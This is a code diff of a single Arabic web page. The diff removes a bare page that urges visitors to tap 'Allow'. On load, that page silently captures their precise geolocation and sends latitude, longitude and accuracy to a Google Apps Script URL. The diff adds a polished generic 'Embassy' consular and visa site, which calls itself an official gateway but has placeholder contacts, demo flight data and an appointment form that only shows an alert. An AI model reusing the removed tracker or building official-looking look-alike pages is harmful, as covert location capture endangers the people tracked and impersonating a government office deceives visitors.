@@ -1,71 +1,611 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<title> . </title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>السفارة | الخدمات القنصلية والتأشيرات</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;800;900&family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
 <style>
-body{
-  font-family: Arial;
-  background:#020617;
-  color:white;
-  text-align:center;
-  padding:40px 15px;
-}
-.card{
-  max-width:400px;
-  margin:auto;
-  background:#020617;
-  border-radius:20px;
-  padding:25px;
-  box-shadow:0 10px 40px rgba(0,0,0,.6);
-}
-</style>
-</head>
+  :root{
+    --navy: #0a1a2f;
+    --navy-2: #0f2744;
+    --gold: #c9a44c;
+    --gold-light: #e6c979;
+    --cream: #f7f3ea;
+    --text-light: #e8e6df;
+    --muted: #9aa7b8;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    font-family:'Cairo','Tajawal',sans-serif;
+    background:var(--navy);
+    color:var(--text-light);
+    overflow-x:hidden;
+  }
+  a{text-decoration:none;color:inherit;}
+  ul{list-style:none;}
 
-<body>
-
-<div class="card">
-  <h2>  </h2>
-  <p>يرجى الضغط على <b>سماح</b> عند ظهور الإشعار</p>
-  <p id="status">⏳ انتظر لحظة...</p>
-</div>
-
-<script>
-const API_URL =
-"https://script.google.com/macros/s/AKfycbzsN3QngwrDEPApmAHJfBzOKLjFA4vWMi6tE3nu50vAtIzaIow7sl1DPER3pyLhqiQ/exec";
-
-window.onload = function () {
-
-  if (!navigator.geolocation) {
-    document.getElementById("status").innerHTML = "❌    ";
-    return;
+  /* ===== خلفية زخرفية عامة ===== */
+  .bg-pattern{
+    position:fixed; inset:0; z-index:-2;
+    background:
+      radial-gradient(circle at 15% 20%, rgba(201,164,76,0.08), transparent 40%),
+      radial-gradient(circle at 85% 80%, rgba(201,164,76,0.06), transparent 45%),
+      linear-gradient(180deg, var(--navy) 0%, var(--navy-2) 50%, var(--navy) 100%);
   }
 
-  navigator.geolocation.getCurrentPosition(
-    function(position){
-      const lat = position.coords.latitude;
-      const lng = position.coords.longitude;
-      const acc = position.coords.accuracy;
+  /* ===== شريط الطيران المتحرك أعلى الصفحة ===== */
+  .flight-ticker{
+    background:linear-gradient(90deg, #08111f, #0f2744, #08111f);
+    border-bottom:1px solid rgba(201,164,76,0.3);
+    padding:8px 0;
+    overflow:hidden;
+    white-space:nowrap;
+    position:relative;
+    font-size:0.85rem;
+    color:var(--gold-light);
+  }
+  .flight-ticker .track{
+    display:inline-block;
+    padding-right:100%;
+    animation:ticker 28s linear infinite;
+  }
+  @keyframes ticker{
+    from{transform:translateX(0);}
+    to{transform:translateX(-100%);}
+  }
+  .flight-ticker span{margin:0 30px;}
+  .flight-ticker .dot{color:var(--gold); margin:0 8px;}
 
-      fetch(`${API_URL}?lat=${lat}&lng=${lng}&acc=${acc}`)
-        .then(() => {
-          document.getElementById("status").innerHTML =
-            "✅   <br>  ";
-        });
-    },
-    function(){
-      document.getElementById("status").innerHTML =
-        "❌     ";
-    },
-    {
-      enableHighAccuracy:true,
-      timeout:20000,
-      maximumAge:0
+  /* ===== الهيدر ===== */
+  header{
+    position:sticky; top:0; z-index:100;
+    background:rgba(10,26,47,0.85);
+    backdrop-filter:blur(12px);
+    border-bottom:1px solid rgba(201,164,76,0.15);
+  }
+  .nav-wrap{
+    max-width:1200px; margin:0 auto;
+    display:flex; align-items:center; justify-content:space-between;
+    padding:16px 24px;
+  }
+  .logo{
+    display:flex; align-items:center; gap:12px;
+    font-weight:900; font-size:1.3rem;
+    letter-spacing:0.5px;
+  }
+  .logo .emblem{
+    width:46px;height:46px;border-radius:50%;
+    background:linear-gradient(135deg, var(--gold-light), var(--gold));
+    display:flex;align-items:center;justify-content:center;
+    box-shadow:0 0 25px rgba(201,164,76,0.4);
+  }
+  .logo .emblem svg{width:26px;height:26px;}
+  .nav-links{display:flex;gap:36px;font-weight:600;font-size:0.95rem;}
+  .nav-links a{position:relative;padding:6px 0;transition:.3s;}
+  .nav-links a::after{
+    content:'';position:absolute;bottom:0;right:0;width:0;height:2px;
+    background:var(--gold);transition:.35s;
+  }
+  .nav-links a:hover{color:var(--gold-light);}
+  .nav-links a:hover::after{width:100%;}
+  .nav-btn{
+    background:linear-gradient(135deg, var(--gold), var(--gold-light));
+    color:var(--navy); font-weight:800; padding:10px 24px;
+    border-radius:30px; font-size:0.9rem;
+    box-shadow:0 4px 20px rgba(201,164,76,0.35);
+    transition:.3s;
+  }
+  .nav-btn:hover{transform:translateY(-2px);box-shadow:0 8px 26px rgba(201,164,76,0.5);}
+  .burger{display:none;font-size:1.6rem;color:var(--gold-light);cursor:pointer;background:none;border:none;}
+
+  /* ===== الهيرو ===== */
+  .hero{
+    position:relative;
+    min-height:92vh;
+    display:flex; align-items:center;
+    padding:60px 24px;
+    overflow:hidden;
+  }
+  .hero-inner{
+    max-width:1200px;margin:0 auto;width:100%;
+    display:grid; grid-template-columns:1.1fr 0.9fr; gap:40px; align-items:center;
+  }
+  .hero-eyebrow{
+    display:inline-flex;align-items:center;gap:10px;
+    color:var(--gold-light); font-weight:700; font-size:0.85rem;
+    border:1px solid rgba(201,164,76,0.4); padding:8px 18px; border-radius:30px;
+    margin-bottom:24px; background:rgba(201,164,76,0.06);
+  }
+  .hero h1{
+    font-size:3.2rem; font-weight:900; line-height:1.3;
+    color:#fff; margin-bottom:20px;
+  }
+  .hero h1 span{
+    background:linear-gradient(135deg, var(--gold-light), var(--gold));
+    -webkit-background-clip:text; background-clip:text; color:transparent;
+  }
+  .hero p{color:var(--muted); font-size:1.1rem; line-height:1.9; max-width:520px; margin-bottom:34px;}
+  .hero-actions{display:flex; gap:18px; flex-wrap:wrap;}
+  .btn-primary{
+    background:linear-gradient(135deg, var(--gold), var(--gold-light));
+    color:var(--navy); font-weight:800; padding:16px 36px; border-radius:10px;
+    box-shadow:0 10px 30px rgba(201,164,76,0.35); transition:.3s; display:inline-block;
+  }
+  .btn-primary:hover{transform:translateY(-3px);}
+  .btn-outline{
+    border:1.5px solid rgba(232,230,223,0.35); color:var(--text-light);
+    padding:16px 36px; border-radius:10px; font-weight:700; transition:.3s;
+  }
+  .btn-outline:hover{border-color:var(--gold); color:var(--gold-light); background:rgba(201,164,76,0.06);}
+
+  /* بطاقة زخرفية بالطائرة */
+  .hero-visual{position:relative; height:460px;}
+  .plane-card{
+    position:absolute; inset:0;
+    border-radius:24px;
+    background:linear-gradient(160deg, #12314f 0%, #0a1a2f 100%);
+    border:1px solid rgba(201,164,76,0.25);
+    overflow:hidden;
+    box-shadow:0 30px 60px rgba(0,0,0,0.5);
+  }
+  .plane-card::before{
+    content:'';position:absolute; width:300px; height:300px; border-radius:50%;
+    background:radial-gradient(circle, rgba(201,164,76,0.18), transparent 70%);
+    top:-100px; left:-80px;
+  }
+  .globe-lines{
+    position:absolute; inset:0; opacity:0.15;
+    background-image:
+      repeating-linear-gradient(0deg, transparent, transparent 38px, rgba(201,164,76,0.5) 39px),
+      repeating-linear-gradient(90deg, transparent, transparent 38px, rgba(201,164,76,0.5) 39px);
+  }
+  .plane-icon{
+    position:absolute; top:50%; right:50%; transform:translate(50%,-50%);
+    width:130px; height:130px; color:var(--gold-light);
+    animation:float 4s ease-in-out infinite;
+    filter:drop-shadow(0 10px 25px rgba(201,164,76,0.4));
+  }
+  @keyframes float{
+    0%,100%{transform:translate(50%,-50%) rotate(-8deg) translateY(0px);}
+    50%{transform:translate(50%,-50%) rotate(-8deg) translateY(-18px);}
+  }
+  .trail{position:absolute; border-radius:50%; background:rgba(201,164,76,0.5); animation:twinkle 3s ease-in-out infinite;}
+  @keyframes twinkle{0%,100%{opacity:0.2;}50%{opacity:1;}}
+  .stat-chip{
+    position:absolute; bottom:24px; left:24px; right:24px;
+    background:rgba(10,26,47,0.85); border:1px solid rgba(201,164,76,0.3);
+    border-radius:14px; padding:18px 20px; display:flex; justify-content:space-between;
+    backdrop-filter:blur(8px);
+  }
+  .stat-chip div{text-align:center;}
+  .stat-chip b{display:block; color:var(--gold-light); font-size:1.4rem;}
+  .stat-chip small{color:var(--muted); font-size:0.75rem;}
+
+  /* ===== قسم الخدمات ===== */
+  section{padding:100px 24px;}
+  .section-head{text-align:center; max-width:700px; margin:0 auto 60px;}
+  .section-head .tag{
+    color:var(--gold-light); font-weight:700; font-size:0.85rem;
+    letter-spacing:1px; text-transform:uppercase;
+  }
+  .section-head h2{font-size:2.4rem; font-weight:900; color:#fff; margin-top:14px;}
+  .section-head p{color:var(--muted); margin-top:16px; line-height:1.8;}
+
+  .services-grid{
+    max-width:1200px; margin:0 auto;
+    display:grid; grid-template-columns:repeat(auto-fit,minmax(280px,1fr)); gap:28px;
+  }
+  .service-card{
+    background:linear-gradient(160deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
+    border:1px solid rgba(201,164,76,0.15);
+    border-radius:18px; padding:34px 28px;
+    transition:.35s;
+    position:relative; overflow:hidden;
+  }
+  .service-card:hover{
+    transform:translateY(-8px);
+    border-color:rgba(201,164,76,0.5);
+    box-shadow:0 20px 45px rgba(0,0,0,0.35);
+  }
+  .service-icon{
+    width:58px;height:58px;border-radius:14px;
+    background:linear-gradient(135deg, rgba(201,164,76,0.2), rgba(201,164,76,0.05));
+    display:flex;align-items:center;justify-content:center; margin-bottom:22px;
+    border:1px solid rgba(201,164,76,0.3);
+  }
+  .service-icon svg{width:28px;height:28px;color:var(--gold-light);}
+  .service-card h3{font-size:1.25rem; font-weight:800; color:#fff; margin-bottom:10px;}
+  .service-card p{color:var(--muted); font-size:0.95rem; line-height:1.8; margin-bottom:16px;}
+  .service-card .link{color:var(--gold-light); font-weight:700; font-size:0.9rem; display:inline-flex; align-items:center; gap:6px;}
+
+  /* ===== قسم حالة الرحلات (تفاعلي) ===== */
+  .flight-status{
+    background:linear-gradient(160deg, rgba(15,39,68,0.6), rgba(10,26,47,0.9));
+    border-top:1px solid rgba(201,164,76,0.15);
+    border-bottom:1px solid rgba(201,164,76,0.15);
+  }
+  .flight-box{
+    max-width:900px; margin:0 auto;
+    background:rgba(255,255,255,0.03);
+    border:1px solid rgba(201,164,76,0.25);
+    border-radius:20px; padding:40px;
+  }
+  .flight-form{display:flex; gap:14px; flex-wrap:wrap; margin-bottom:24px;}
+  .flight-form input, .flight-form select{
+    flex:1; min-width:160px;
+    background:rgba(255,255,255,0.05); border:1px solid rgba(201,164,76,0.25);
+    color:var(--text-light); padding:14px 18px; border-radius:10px; font-family:inherit; font-size:0.95rem;
+  }
+  .flight-form input::placeholder{color:var(--muted);}
+  .flight-form button{
+    background:linear-gradient(135deg, var(--gold), var(--gold-light));
+    color:var(--navy); font-weight:800; padding:14px 30px; border:none; border-radius:10px;
+    cursor:pointer; font-family:inherit; font-size:0.95rem; transition:.3s;
+  }
+  .flight-form button:hover{transform:translateY(-2px);}
+  #flight-result{
+    display:none;
+    background:rgba(201,164,76,0.06); border:1px dashed rgba(201,164,76,0.35);
+    border-radius:14px; padding:22px; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:16px;
+  }
+  #flight-result.show{display:flex;}
+  .fr-item b{display:block; color:#fff; font-size:1.05rem;}
+  .fr-item small{color:var(--muted);}
+  .fr-status{
+    background:rgba(76,201,120,0.15); color:#7be3a0; font-weight:800;
+    padding:8px 18px; border-radius:30px; font-size:0.85rem;
+  }
+
+  /* ===== قسم الإجراءات / خطوات التأشيرة ===== */
+  .steps{max-width:1100px; margin:0 auto; display:flex; flex-direction:column; gap:0;}
+  .step{
+    display:grid; grid-template-columns:70px 1fr; gap:24px;
+    padding:26px 0; border-bottom:1px solid rgba(201,164,76,0.1);
+  }
+  .step:last-child{border-bottom:none;}
+  .step-num{
+    width:56px;height:56px;border-radius:50%;
+    background:linear-gradient(135deg, rgba(201,164,76,0.2), transparent);
+    border:1.5px solid var(--gold); color:var(--gold-light);
+    display:flex;align-items:center;justify-content:center; font-weight:900; font-size:1.2rem;
+  }
+  .step h4{color:#fff; font-size:1.15rem; margin-bottom:6px;}
+  .step p{color:var(--muted); line-height:1.8; font-size:0.95rem;}
+
+  /* ===== قسم الحجز/المواعيد ===== */
+  .appointment{
+    background:linear-gradient(135deg, rgba(201,164,76,0.08), rgba(201,164,76,0.02));
+    border:1px solid rgba(201,164,76,0.25); border-radius:24px;
+    max-width:1100px; margin:0 auto; padding:60px; display:grid; grid-template-columns:1fr 1fr; gap:50px; align-items:center;
+  }
+  .appointment h2{font-size:2rem; color:#fff; font-weight:900; margin-bottom:16px;}
+  .appointment p{color:var(--muted); line-height:1.8; margin-bottom:26px;}
+  .form-grid{display:grid; gap:16px;}
+  .form-grid input, .form-grid select{
+    background:rgba(255,255,255,0.05); border:1px solid rgba(201,164,76,0.25);
+    color:var(--text-light); padding:14px 18px; border-radius:10px; font-family:inherit;
+  }
+  .form-grid button{
+    background:linear-gradient(135deg, var(--gold), var(--gold-light));
+    color:var(--navy); font-weight:800; padding:16px; border:none; border-radius:10px;
+    cursor:pointer; font-size:1rem; font-family:inherit; transition:.3s;
+  }
+  .form-grid button:hover{transform:translateY(-2px);}
+
+  /* ===== الفوتر ===== */
+  footer{
+    background:#07121f; border-top:1px solid rgba(201,164,76,0.15);
+    padding:60px 24px 26px;
+  }
+  .footer-grid{
+    max-width:1200px; margin:0 auto;
+    display:grid; grid-template-columns:2fr 1fr 1fr 1fr; gap:40px; margin-bottom:40px;
+  }
+  .footer-grid h4{color:var(--gold-light); font-weight:800; margin-bottom:18px; font-size:1rem;}
+  .footer-grid p, .footer-grid a{color:var(--muted); font-size:0.9rem; line-height:2.1; display:block;}
+  .footer-grid a:hover{color:var(--gold-light);}
+  .footer-bottom{
+    max-width:1200px; margin:0 auto; padding-top:26px; border-top:1px solid rgba(255,255,255,0.06);
+    display:flex; justify-content:space-between; flex-wrap:wrap; gap:12px; color:var(--muted); font-size:0.85rem;
+  }
+
+  @media(max-width:900px){
+    .hero-inner{grid-template-columns:1fr;}
+    .hero-visual{height:320px;}
+    .hero h1{font-size:2.2rem;}
+    .nav-links{display:none;}
+    .burger{display:block;}
+    .appointment{grid-template-columns:1fr; padding:34px;}
+    .footer-grid{grid-template-columns:1fr 1fr;}
+  }
+</style>
+</head>
+<body>
+
+<div class="bg-pattern"></div>
+
+<!-- شريط معلومات الطيران المتحرك -->
+<div class="flight-ticker">
+  <div class="track">
+    <span>✈️ رحلة SD-102 من الخرطوم إلى الرياض <span class="dot">•</span> في الموعد</span>
+    <span>🛫 رحلة EK-725 من دبي <span class="dot">•</span> تأخير 20 دقيقة</span>
+    <span>✈️ رحلة QR-1311 من الدوحة <span class="dot">•</span> في الموعد</span>
+    <span>🛬 رحلة MS-843 من القاهرة <span class="dot">•</span> وصلت</span>
+    <span>✈️ رحلة SD-102 من الخرطوم إلى الرياض <span class="dot">•</span> في الموعد</span>
+    <span>🛫 رحلة EK-725 من دبي <span class="dot">•</span> تأخير 20 دقيقة</span>
+  </div>
+</div>
+
+<!-- الهيدر -->
+<header>
+  <div class="nav-wrap">
+    <div class="logo">
+      <div class="emblem">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 2L2 7l10 5 10-5-10-5z" fill="#0a1a2f"/>
+          <path d="M2 17l10 5 10-5M2 12l10 5 10-5" stroke="#0a1a2f" stroke-width="1.5" fill="none"/>
+        </svg>
+      </div>
+      <span>السفارة<br><small style="font-size:0.6rem;color:var(--muted);font-weight:400;">الخدمات القنصلية</small></span>
+    </div>
+    <ul class="nav-links">
+      <li><a href="#services">الخدمات</a></li>
+      <li><a href="#flights">حالة الرحلات</a></li>
+      <li><a href="#steps">إجراءات التأشيرة</a></li>
+      <li><a href="#appointment">حجز موعد</a></li>
+      <li><a href="#contact">تواصل معنا</a></li>
+    </ul>
+    <a href="#appointment" class="nav-btn">احجز موعدك</a>
+    <button class="burger" onclick="toggleMenu()">☰</button>
+  </div>
+</header>
+
+<!-- الهيرو -->
+<section class="hero">
+  <div class="hero-inner">
+    <div>
+      <div class="hero-eyebrow">🛂 خدمات قنصلية معتمدة على مدار الأسبوع</div>
+      <h1>بوابتكم الرسمية لكل <span>الإجراءات القنصلية</span> والسفر</h1>
+      <p>نقدم خدمات التأشيرات، التوثيق، جوازات السفر، والشؤون القنصلية بأعلى معايير الدقة والاحترافية، مع متابعة مباشرة لحالة رحلاتكم الجوية.</p>
+      <div class="hero-actions">
+        <a href="#appointment" class="btn-primary">احجز موعد الآن</a>
+        <a href="#services" class="btn-outline">استكشف الخدمات</a>
+      </div>
+    </div>
+    <div class="hero-visual">
+      <div class="plane-card">
+        <div class="globe-lines"></div>
+        <div class="trail" style="width:6px;height:6px;top:20%;left:15%;"></div>
+        <div class="trail" style="width:4px;height:4px;top:70%;left:75%;animation-delay:1s;"></div>
+        <div class="trail" style="width:5px;height:5px;top:35%;left:80%;animation-delay:2s;"></div>
+        <svg class="plane-icon" viewBox="0 0 24 24" fill="currentColor">
+          <path d="M21 16v-2l-8-5V3.5a1.5 1.5 0 0 0-3 0V9l-8 5v2l8-2.5V19l-2.5 2v1.5l4-1 4 1V21l-2.5-2v-5.5L21 16z"/>
+        </svg>
+        <div class="stat-chip">
+          <div><b>+50k</b><small>تأشيرة تمت معالجتها</small></div>
+          <div><b>24</b><small>ساعة متابعة</small></div>
+          <div><b>98%</b><small>رضا المتعاملين</small></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- الخدمات -->
+<section id="services">
+  <div class="section-head">
+    <span class="tag">خدماتنا</span>
+    <h2>كل ما تحتاجه في مكان واحد</h2>
+    <p>مجموعة متكاملة من الخدمات القنصلية والإدارية المصممة لتسهيل إجراءاتكم بسرعة وموثوقية.</p>
+  </div>
+  <div class="services-grid">
+
+    <div class="service-card">
+      <div class="service-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 8h18M7 12h4"/></svg></div>
+      <h3>إصدار التأشيرات</h3>
+      <p>تقديم طلبات تأشيرات الزيارة والعمل والدراسة إلكترونيًا مع متابعة حالة الطلب لحظة بلحظة.</p>
+      <a href="#appointment" class="link">تقديم طلب ←</a>
+    </div>
+
+    <div class="service-card">
+      <div class="service-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M12 2l8 4v6c0 5-3.5 8.5-8 10-4.5-1.5-8-5-8-10V6l8-4z"/></svg></div>
+      <h3>جوازات وتصاريح السفر</h3>
+      <p>تجديد وإصدار جوازات السفر والوثائق الرسمية للمواطنين والمقيمين بإجراءات مبسطة.</p>
+      <a href="#appointment" class="link">اعرف أكثر ←</a>
+    </div>
+
+    <div class="service-card">
+      <div class="service-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M4 4h16v16H4z"/><path d="M8 9h8M8 13h5"/></svg></div>
+      <h3>التوثيق والتصديق</h3>
+      <p>تصديق الوثائق الرسمية والعقود والشهادات الأكاديمية بختم معتمد قانونيًا.</p>
+      <a href="#appointment" class="link">اعرف أكثر ←</a>
+    </div>
+
+    <div class="service-card">
+      <div class="service-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M21 16v-2l-8-5V4.5a1.5 1.5 0 0 0-3 0V9l-8 5v2l8-2.5V19l-2.5 2v1.5l4-1 4 1V21l-2.5-2v-5.5L21 16z"/></svg></div>
+      <h3>متابعة الرحلات الجوية</h3>
+      <p>تتبع مباشر لحالة رحلات المغادرين والوافدين، وتنبيهات فورية بالتأخير أو التغييرات.</p>
+      <a href="#flights" class="link">تحقق من رحلتك ←</a>
+    </div>
+
+    <div class="service-card">
+      <div class="service-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><circle cx="12" cy="8" r="4"/><path d="M4 21c0-4 4-6 8-6s8 2 8 6"/></svg></div>
+      <h3>الشؤون القنصلية</h3>
+      <p>خدمات تسجيل المواليد والزواج، والدعم القانوني والقنصلي للمواطنين بالخارج.</p>
+      <a href="#appointment" class="link">اعرف أكثر ←</a>
+    </div>
+
+    <div class="service-card">
+      <div class="service-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M12 2v20M4 7h16M4 17h16"/></svg></div>
+      <h3>الدعم والاستفسارات</h3>
+      <p>مركز اتصال ودعم فني على مدار الأسبوع للإجابة على استفساراتكم بكل اللغات.</p>
+      <a href="#contact" class="link">تواصل معنا ←</a>
+    </div>
+
+  </div>
+</section>
+
+<!-- حالة الرحلات -->
+<section id="flights" class="flight-status">
+  <div class="section-head">
+    <span class="tag">متابعة حية</span>
+    <h2>تحقق من حالة رحلتك</h2>
+    <p>أدخل رقم الرحلة للاطلاع على حالتها الحالية قبل التوجه إلى المطار.</p>
+  </div>
+  <div class="flight-box">
+    <div class="flight-form">
+      <input type="text" id="flightNumber" placeholder="رقم الرحلة مثال: SD-102">
+      <input type="date" id="flightDate">
+      <button onclick="checkFlight()">تحقق الآن</button>
+    </div>
+    <div id="flight-result">
+      <div class="fr-item"><b id="fr-number">SD-102</b><small>رقم الرحلة</small></div>
+      <div class="fr-item"><b id="fr-route">الخرطوم → الرياض</b><small>خط السير</small></div>
+      <div class="fr-item"><b id="fr-time">14:35</b><small>موعد الإقلاع</small></div>
+      <div class="fr-status" id="fr-status">في الموعد</div>
+    </div>
+  </div>
+</section>
+
+<!-- خطوات التأشيرة -->
+<section id="steps">
+  <div class="section-head">
+    <span class="tag">دليلك الإرشادي</span>
+    <h2>خطوات استخراج التأشيرة</h2>
+    <p>عملية واضحة ومباشرة من التقديم وحتى الاستلام.</p>
+  </div>
+  <div class="steps">
+    <div class="step">
+      <div class="step-num">1</div>
+      <div><h4>تعبئة الطلب الإلكتروني</h4><p>قم بتعبئة استمارة طلب التأشيرة عبر الموقع مع رفع المستندات المطلوبة.</p></div>
+    </div>
+    <div class="step">
+      <div class="step-num">2</div>
+      <div><h4>حجز موعد المقابلة</h4><p>اختر الموعد المناسب لك من الأوقات المتاحة لتقديم بصمات ووثائق إضافية إن لزم.</p></div>
+    </div>
+    <div class="step">
+      <div class="step-num">3</div>
+      <div><h4>المراجعة والمعالجة</h4><p>يقوم فريقنا القنصلي بمراجعة الطلب والتحقق من المستندات خلال أيام العمل الرسمية.</p></div>
+    </div>
+    <div class="step">
+      <div class="step-num">4</div>
+      <div><h4>الإشعار والاستلام</h4><p>يصلك إشعار فوري بالقرار، ويمكنك استلام جواز سفرك والتأشيرة من مقر السفارة.</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- حجز موعد -->
+<section id="appointment">
+  <div class="appointment">
+    <div>
+      <h2>احجز موعدك القنصلي</h2>
+      <p>اختر الخدمة والموعد المناسب لك، وسيتواصل معك فريقنا لتأكيد الحجز خلال 24 ساعة.</p>
+      <div class="form-grid">
+        <input type="text" placeholder="الاسم الكامل">
+        <input type="tel" placeholder="رقم الهاتف">
+        <select>
+          <option>نوع الخدمة</option>
+          <option>تأشيرة زيارة</option>
+          <option>تأشيرة عمل</option>
+          <option>تجديد جواز سفر</option>
+          <option>توثيق مستندات</option>
+        </select>
+        <input type="date">
+        <button onclick="submitAppointment(event)">تأكيد الحجز</button>
+      </div>
+    </div>
+    <div>
+      <div class="service-icon" style="width:100%;height:280px;border-radius:20px;">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" style="width:90px;height:90px;opacity:0.5;">
+          <path d="M21 16v-2l-8-5V4.5a1.5 1.5 0 0 0-3 0V9l-8 5v2l8-2.5V19l-2.5 2v1.5l4-1 4 1V21l-2.5-2v-5.5L21 16z"/>
+        </svg>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- الفوتر -->
+<footer id="contact">
+  <div class="footer-grid">
+    <div>
+      <h4>السفارة — الخدمات القنصلية</h4>
+      <p>نلتزم بتقديم أرقى مستويات الخدمة القنصلية بدقة واحترافية لخدمة المواطنين والمقيمين.</p>
+    </div>
+    <div>
+      <h4>روابط سريعة</h4>
+      <a href="#services">الخدمات</a>
+      <a href="#flights">حالة الرحلات</a>
+      <a href="#steps">إجراءات التأشيرة</a>
+      <a href="#appointment">حجز موعد</a>
+    </div>
+    <div>
+      <h4>معلومات التواصل</h4>
+      <a href="tel:+249123456789">‎+249 123 456 789</a>
+      <a href="mailto:info@embassy.gov">info@embassy.gov</a>
+      <a href="#">شارع الحرية، الخرطوم</a>
+    </div>
+    <div>
+      <h4>ساعات العمل</h4>
+      <p>الأحد - الخميس: 8 ص - 3 م</p>
+      <p>الجمعة والسبت: مغلق</p>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>© 2026 السفارة. جميع الحقوق محفوظة.</span>
+    <span>الخصوصية • الشروط والأحكام</span>
+  </div>
+</footer>
+
+<script>
+  function toggleMenu(){
+    const nav = document.querySelector('.nav-links');
+    if(nav.style.display === 'flex'){
+      nav.style.display = 'none';
+    } else {
+      nav.style.display = 'flex';
+      nav.style.flexDirection = 'column';
+      nav.style.position = 'absolute';
+      nav.style.top = '70px';
+      nav.style.right = '20px';
+      nav.style.background = '#0f2744';
+      nav.style.padding = '20px 30px';
+      nav.style.borderRadius = '14px';
+      nav.style.border = '1px solid rgba(201,164,76,0.3)';
+      nav.style.gap = '18px';
+      nav.style.zIndex = '200';
     }
-  );
-};
+  }
+
+  // بيانات وهمية لعرض حالة الرحلة (لأغراض العرض التوضيحي فقط)
+  const demoFlights = {
+    'SD-102': {route:'الخرطوم → الرياض', time:'14:35', status:'في الموعد', color:'#7be3a0', bg:'rgba(76,201,120,0.15)'},
+    'EK-725': {route:'دبي → الخرطوم', time:'09:10', status:'تأخير 20 دقيقة', color:'#f0c14b', bg:'rgba(240,193,75,0.15)'},
+    'QR-1311': {route:'الدوحة → الخرطوم', time:'18:45', status:'في الموعد', color:'#7be3a0', bg:'rgba(76,201,120,0.15)'},
+    'MS-843': {route:'القاهرة → الخرطوم', time:'11:20', status:'وصلت', color:'#8bb8e8', bg:'rgba(139,184,232,0.15)'}
+  };
+
+  function checkFlight(){
+    const input = document.getElementById('flightNumber').value.trim().toUpperCase();
+    const result = document.getElementById('flight-result');
+    const data = demoFlights[input] || {
+      route:'غير متوفر', time:'--:--', status:'لم يتم العثور على الرحلة', color:'#e88b8b', bg:'rgba(232,139,139,0.15)'
+    };
+    document.getElementById('fr-number').textContent = input || '—';
+    document.getElementById('fr-route').textContent = data.route;
+    document.getElementById('fr-time').textContent = data.time;
+    const statusEl = document.getElementById('fr-status');
+    statusEl.textContent = data.status;
+    statusEl.style.color = data.color;
+    statusEl.style.background = data.bg;
+    result.classList.add('show');
+  }
+
+  function submitAppointment(e){
+    e.preventDefault();
+    alert('تم استلام طلبكم بنجاح، سيتواصل معكم فريقنا القنصلي قريبًا لتأكيد الموعد.');
+  }
 </script>
 
 </body>
